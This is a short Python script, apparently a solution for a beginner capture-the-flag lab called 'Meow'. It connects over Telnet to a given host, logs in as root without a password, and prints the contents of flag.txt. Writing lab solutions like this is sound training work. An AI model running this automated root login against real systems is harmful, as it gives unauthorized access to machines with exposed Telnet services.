```python
#!/usr/bin/env python3

import argparse
import asyncio, telnetlib3
from termcolor import colored


def get_args():

    parser = argparse.ArgumentParser()
    parser.add_argument('-lh', '--lhost', help='Dirección IP del servidor', dest='host')
    parser.add_argument('-p', '--port', help='Puerto del servicio en el que está corriendo el servicio Telnet', type=int, dest='port')

    return parser.parse_args()


async def write_to_server(wr, txt):
    wr.write(txt)
    await wr.drain()


async def meow(host, port):
    
    reader, writer = await telnetlib3.open_connection(host, port)

    banner = await reader.readuntil(b'login: ')
    print(banner.decode('utf-8'), end='')

    await write_to_server(writer, 'root\n')

    shell = await reader.readuntil(b"#")
    print(f'\n', shell.decode('utf-8'))

    await write_to_server(writer, 'cat flag.txt\n')
    flag = await reader.readuntil(b"#")
    
    flag = flag.decode('utf-8').split('\r\n')[1]
    print(colored(f'\n[+]', 'blue'), 'Root flag:', colored(f'{flag}', 'green'), colored('[+]', 'blue'))

    writer.close()

	
if __name__ == '__main__':

    print(colored('\n[+]', 'blue'), 'Meow', colored('[+]', 'blue'))

    args = get_args()
    
    asyncio.run(meow(args.host, args.port))
```